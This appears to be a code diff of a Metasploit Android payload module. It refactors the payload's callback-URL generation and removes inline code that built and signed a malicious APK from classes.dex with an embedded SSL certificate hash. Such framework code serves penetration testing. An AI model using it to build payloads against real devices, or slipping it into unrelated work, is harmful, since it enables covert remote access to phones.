@@ -29,8 +29,13 @@ module MetasploitModule
   end
 
   def generate_jar(opts={})
+    opts[:ssl] = true
+    super(opts)
+  end
+
+  def payload_uri(req=nil)
     # Default URL length is 30-256 bytes
-    uri_req_len = 30 + rand(256-30)
+    uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
     # Generate the short default URL if we don't know available space
     if self.available_space.nil?
       uri_req_len = 5
@@ -40,29 +45,8 @@ module MetasploitModule
     # TODO: perhaps wire in an existing UUID from opts?
     url << generate_uri_uuid_mode(:init_java, uri_req_len)
 
-    classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
-
-    verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
-                                         datastore['HandlerSSLCert'])
-    if verify_cert_hash
-        hash = 'WWWW' + verify_cert_hash.unpack("H*").first
-        string_sub(classes, 'WWWW                                        ', hash)
-    end
-
-    apply_options(classes, opts, url)
-
-    jar = Rex::Zip::Jar.new
-    jar.add_file("classes.dex", fix_dex_header(classes))
-    files = [
-      [ "AndroidManifest.xml" ],
-      [ "resources.arsc" ]
-    ]
-    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
-    jar.build_manifest
-
-    cert, key = generate_cert
-    jar.sign(key, cert, [cert])
-
-    jar
+    url
   end
+
+
 end
